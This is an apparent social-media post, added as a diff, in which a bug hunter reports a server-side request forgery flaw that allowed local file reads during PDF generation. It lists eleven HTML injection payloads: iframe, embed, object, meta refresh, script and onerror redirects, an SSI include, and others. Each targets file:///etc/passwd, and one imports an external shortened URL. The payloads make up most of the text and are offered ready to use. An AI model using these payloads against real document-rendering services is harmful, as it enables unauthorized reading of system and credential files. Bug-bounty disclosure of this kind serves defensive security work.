@@ -1,0 +1,16 @@
+Guess what? 🚀 I have just uncovered a high-severity SSRF (Server-Side Request Forgery) vulnerability that allowed local file read during PDF generation processes. 
+📄 This vulnerability posed a serious risk, potentially granting unauthorized access to sensitive files. 💻
+
+Here are some payloads that successfully demonstrated the exploit:
+
+1. <iframe src='file:///etc/passwd' width='600' height='600'>
+2. <embed src='file:///etc/passwd' width='600' height='600'>
+3. <object data='file:///etc/passwd' width='600' height='600' type='text/html'>
+4. <portal src='file:///etc/passwd' id='portal'>
+5. <link rel='attachment' href='file:///etc/passwd'>
+6. <annotation file='/etc/passwd' content='/etc/passwd' icon='Graph' title='Attached File' pos-x='195'>
+7. <​meta http-equiv='refresh' content='0;url=file:///etc/passwd'>
+8. <​script>window.location = "file:///etc/passwd";<​/script>
+9. <img src="x" onerror​="window.location='file:///etc/passwd'">
+10. <link rel="import" href="https://lnkd.in/gsf3JpAK">
+11. <!--hashtag#include file="file:///etc/passwd" -->
